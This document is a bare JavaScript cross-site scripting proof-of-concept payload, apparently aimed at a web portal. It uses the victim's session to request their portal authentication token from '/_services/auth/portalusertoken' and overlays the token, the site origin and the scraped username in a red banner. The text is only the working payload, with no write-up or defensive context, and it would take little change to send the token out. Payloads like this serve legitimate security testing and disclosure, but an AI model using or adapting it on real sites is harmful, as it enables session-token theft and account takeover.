fetch('/_services/auth/portalusertoken', {
  method: 'POST',
  credentials: 'include'
})
.then(r => r.text())
.then(token => {
  var div = document.createElement('div');
  div.style = 'position:fixed;top:0;left:0;width:100%;background:#cc0000;color:#fff;z-index:99999;padding:20px;font-size:13px;font-family:monospace;word-wrap:break-word;';
  div.innerHTML = '<b>XSS PoC - Portal Auth Token Captured</b><br><br>'
    + '<b>Token:</b> ' + token + '<br><br>'
    + '<b>Origin:</b> ' + window.location.origin + '<br>'
    + '<b>User:</b> ' + (document.querySelector('.username, .contact-name, #DisplayName') || {innerText:'not found'}).innerText;
  document.body.appendChild(div);
});